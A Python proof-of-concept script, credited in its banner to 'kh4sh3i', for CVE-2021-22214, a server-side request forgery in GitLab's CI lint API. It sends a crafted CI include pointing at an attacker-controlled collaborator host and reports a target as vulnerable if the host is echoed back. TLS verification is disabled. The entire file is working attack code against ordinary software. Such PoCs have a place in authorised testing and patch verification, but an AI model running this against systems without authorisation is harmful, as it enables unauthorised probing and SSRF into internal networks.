import json
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    print("""
==================================================
        _ _   _       _                     __ 
       (_) | | |     | |                   / _|
   __ _ _| |_| | __ _| |__    ___ ___ _ __| |_ 
  / _` | | __| |/ _` | '_ \  / __/ __| '__|  _|
 | (_| | | |_| | (_| | |_) | \__ \__ \ |  | |  
  \__, |_|\__|_|\__,_|_.__/  |___/___/_|  |_|  
   __/ |                                       
  |___/                                          

   CVE-2021-22214              Powered by kh4sh3i
==================================================
""")

def poc(target: str, collaborator):

    api="/api/v4/ci/lint"
    data = {"include_merged_yaml": True, "content": "include:\n  remote: http://{}/api/v1/targets?test.yml".format(collaborator)}

    headers = {"Content-Type": "application/json"}
    
    r = requests.post(url=target+api , data=json.dumps(data), headers=headers, verify=False)
    if r.status_code == 200:
        if collaborator in r.json()["errors"][0]:
            print ("[+] vulnerable to GitLab SSRF ")
            return
    print ("[-] not vulnerable to GitLab SSRF！")

def main():
    banner()
    if (len(sys.argv) == 3):
        target = sys.argv[1]
        collaborator = sys.argv[2]
        poc(target, collaborator)
    else:
        print("usage:   python3 " + sys.argv[0] + " <target> <burp_collaborator_url>")
        print("example: python3 " + sys.argv[0] + " https://target.com daryz8e5c6h7j2ubvyl1irn0erkj88.burpcollaborator.net\n")


if __name__ == '__main__':
    main()
